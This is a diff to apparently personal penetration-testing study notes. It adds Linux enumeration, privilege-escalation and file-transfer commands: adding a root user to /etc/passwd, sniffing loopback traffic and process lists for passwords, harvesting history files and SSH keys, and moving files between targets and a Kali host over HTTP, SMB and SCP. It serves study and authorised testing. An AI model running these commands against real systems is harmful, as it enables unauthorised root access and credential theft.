@@ -86,6 +86,8 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 
 # Windows Foothold
 ## Enumeration
+### cmd
+### Powershell
 ### winpeas.exe
 
 
@@ -105,8 +107,30 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 
 # Linux Foothold
 ## Enumeration
+- id
+- cat /etc/passwd
+	- If you can somehow edit:
+	- openssl passwd \<new password>
+	- echo "\<new user>:\<hash from above>:0:0:root:/root:/bin/bash" >> /etc/passwd
+	-  or simply copy \<hash from above> into root:<this spot>:etc within the /etc/passwd file
+- cat /etc/issue
+- uname -a
+- hostname
+- ps -aux
+	- watch -n 1 "ps -aux | grep pass"
+- ipconfig
+- ss -anp or netstat
+- dpkg -l (to list applications installed by dpkg)
+- find / -writable -type d 2>/dev/null (find writable directories)
+- cat any /home/.history files
+- check /home/.ssh for keys
+- su root (can't hurt to try)
+- sudo tcpdump -i lo -A | grep "pass"
 
 ## Privilege Escalation
+### Automated tools
+- linpeas.sh
+- unix-privesc-check
 ### SUID Executables - taken from [here](https://medium.com/@balathebug/linux-privilege-escalation-by-using-suid-19d37821ed12)
 - find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 - find / -uid 0 -perm -4000 -type f 2>/dev/null
@@ -136,7 +160,22 @@ OR
 		- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine)
 
 # File Sharing
-
+### Python server
+- From kali: python3 -m http.server \<serving port>
+- From target Windows: 
+	- powershell - iwr -uri http://\<kali IP>:\<serving port>/file -outfile file
+- From target Linux:
+	- wget http://\<kali IP>:\<serving port>/file
+### Over RDP
+- xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:\/<directory>,\<name>
+### SMB
+- From kali: 
+	- sudo impacket-smbserver -smb2support share . -username <kali user> -password <kali pass>
+- From target:  
+	- net use m: \\\<kali IP>\share /user:<kali user> <kali pass>
+	- copy/get file.txt m:\
+### SSH/SCP
+scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
   
 
 # Tool Syntax
